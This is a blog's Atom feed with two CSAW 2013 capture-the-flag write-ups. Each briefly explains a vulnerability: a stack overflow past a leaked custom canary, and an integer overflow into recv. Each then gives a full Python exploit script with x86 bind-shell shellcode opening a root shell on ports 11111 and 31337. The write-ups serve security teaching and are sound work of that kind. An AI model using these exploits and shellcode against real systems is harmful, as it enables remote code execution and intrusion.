<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: CSAW | ejohn]]></title>
  <link href="http://ejohn.github.io/blog/categories/csaw/atom.xml" rel="self"/>
  <link href="http://ejohn.github.io/"/>
  <updated>2013-09-23T19:33:25-04:00</updated>
  <id>http://ejohn.github.io/</id>
  <author>
    <name><![CDATA[ejohn]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW 2013: Exploitation 200]]></title>
    <link href="http://ejohn.github.io/blog/2013/09/23/csaw-2013-exploitation-200/"/>
    <updated>2013-09-23T18:28:00-04:00</updated>
    <id>http://ejohn.github.io/blog/2013/09/23/csaw-2013-exploitation-200</id>
    <content type="html"><![CDATA[<p>This level 200 challenge has a very obvious buffer overflow vulnerability but with a little twist, the devious geniuses at ISIS labs implemented their own custom stack canary buffer overflow protection! Well given that it is a 200 level challenge they made things a lot easier by sending us the canary value used and the address of the buffer on the stack. With these two values in hand its a straight forward buffer overflow exploit.</p>

<h3>Exploit</h3>

<p>```python
import socket
import struct
import time</p>

<p>def pack(addr):</p>

<pre><code>return struct.pack('&lt;I', addr)
</code></pre>

<p>def unpack(addr):</p>

<pre><code>return struct.unpack('&lt;I', addr)
</code></pre>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&lsquo;127.0.0.1&rsquo;, 31338))</p>

<h1>Receive the address of the buffer on the stack</h1>

<p>buffer_address = s.recv(5)
buffer_address = unpack(buffer_address[0:4])[0]</p>

<h1>Calculate the offset from the start of the buffer to the location of the shellcode.</h1>

<h1>Padding: 2048, Canary: 4, Padding: 12, EIP: 4, NOP sled + payload</h1>

<h1>Jump to the middle of the NOP sled</h1>

<p>offset = (2048 + 4 + 12 + 4 + 16)</p>

<p>shellcode_addr = buffer_address + offset
shellcode_addr = pack(shellcode_addr)</p>

<h1>Receive the canary.</h1>

<p>canary = s.recv(4)</p>

<p>s.recv(1024)</p>

<h2><a href="http://www.shell-storm.org/shellcode/files/shellcode-836.php">http://www.shell-storm.org/shellcode/files/shellcode-836.php</a></h2>

<h2>Bind shell on port 11111</h2>

<p>payload = ( &ldquo;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02&rdquo;</p>

<pre><code>        "\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x2b\x67"
        "\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89"
        "\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43"
        "\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79"
        "\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62"
        "\x69\x6e\x89\xe3\x41\xcd\x80")
</code></pre>

<p>s.send(&ldquo;A&rdquo;<em>2048 + canary + &ldquo;AAAABBBBCCCC&rdquo; + shellcode_addr + &ldquo;\x90&rdquo;</em>64 +payload)</p>

<p>s.close()
```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2013: Exploitation 300]]></title>
    <link href="http://ejohn.github.io/blog/2013/09/23/csaw-exploitation-300/"/>
    <updated>2013-09-23T16:34:00-04:00</updated>
    <id>http://ejohn.github.io/blog/2013/09/23/csaw-exploitation-300</id>
    <content type="html"><![CDATA[<p>The level 300 exploitation challenge involved an integer overflow. I figured out the username and password that were hardcoded in the binary. The program then asks for an integer input and uses that as the number of bytes to read parameter in recv(). The only input validation that is performed on this parameter is to check if it is less than 1024. Classic integer overflow vulnerability! Entering <code>-1</code> here lets us enter as much data we need since it gets interpreted as a positive integer. The next thing to notice is that the stack is executable.</p>

<h3>The plan of action</h3>

<ul>
<li>Find the address of recv function in PLT using <code>objdump -d fil_chal | grep recv</code></li>
<li>Find a writable location in the data or bss section of the binary using <code>readelf -S fil_chal</code></li>
<li>Exploit the integer overflow vulnerability and overflow the stack by sending sufficient padding.</li>
<li>Overflow EIP with the address of the recv function. Setup the stack in such a way that <code>recv(4, addr_in_bss, len(shellcode), 0)</code> is called and after recv returns, execution continues at <code>addr_in_bss</code>. I figured the socket descriptor is 4 using strace and checking the recv call made by the binary.</li>
<li>Once the shellcode is read into memory at the address specified, execution jumps to the shellcode and we have a shell listening at port 31337.</li>
</ul>


<h3>Exploit</h3>

<p>```python
import telnetlib
import struct
import time</p>

<p>def pack(addr):</p>

<pre><code>return struct.pack('&lt;I', addr)
</code></pre>

<p>tn = telnetlib.Telnet(&lsquo;127.0.0.1&rsquo;, 34266)</p>

<p>tn.read_until(&lsquo;UserName: &rsquo;)
tn.write(&lsquo;csaw2013&rsquo;)</p>

<p>tn.read_until(&lsquo;Password: &rsquo;)
tn.write(&lsquo;S1mplePWD&rsquo;)</p>

<p>tn.read_until(&lsquo;Entry Info: &rsquo;)
tn.write(&ldquo;-1&rdquo;)</p>

<h2>Shellcode to bind /bin/sh on port 31337</h2>

<h2><a href="http://www.shell-storm.org/shellcode/files/shellcode-847.php">http://www.shell-storm.org/shellcode/files/shellcode-847.php</a></h2>

<p>shellcode = (&ldquo;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51&rdquo;</p>

<pre><code>        "\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0"
        "\x66\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a"
        "\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01"
        "\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89"
        "\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f"
        "\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68"
        "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2"
        "\xb0\x0b\xcd\x80")
</code></pre>

<p>padding = &ldquo;A&rdquo; * 1056
recv = 0x08048890
bss = 0x0804b008 + len(shellcode) + 32</p>

<h2>recv(socket_descriptor, addr_in_bss, num_bytes_to_read, flags)</h2>

<h2>return address after recv = addr_in_bss</h2>

<p>tn.write( padding + pack(recv) +</p>

<pre><code>                pack(bss) + 
                pack(4) + 
                pack(bss) + 
                pack(len(shellcode)) + 
                pack(0) + "\n")
</code></pre>

<p>time.sleep(2)
tn.write(shellcode)</p>

<p>tn.close()</p>

<p>```</p>
]]></content>
  </entry>
  
</feed>
